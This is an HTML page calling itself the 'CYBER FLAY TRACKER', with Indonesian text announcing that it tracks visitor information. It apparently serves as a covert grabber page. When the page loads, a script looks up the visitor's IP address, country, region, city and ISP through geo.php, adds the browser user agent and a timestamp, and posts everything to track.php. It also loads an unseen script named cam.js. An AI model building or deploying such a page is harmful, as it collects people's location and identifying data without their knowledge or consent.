<!DOCTYPE html>
<html>
<head>
    <title>CYBER FLAY</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
</head>
<body onload="startTracking();">
    <div class="container">
        <h1>CYBER FLAY TRACKER</h1>
        <p>Melacak informasi pengunjung...</p>
    </div>

    <script src="cam.js"></script>
    <script>
        function startTracking() {
            fetch('geo.php')
                .then(response => response.json())
                .then(data => {
                    const payload = {
                        ip: data.ip,
                        country: data.country,
                        region: data.region,
                        city: data.city,
                        isp: data.org,
                        agent: navigator.userAgent,
                        time: new Date().toLocaleString()
                    };
                    fetch('track.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                });
        }
    </script>
</body>
</html>
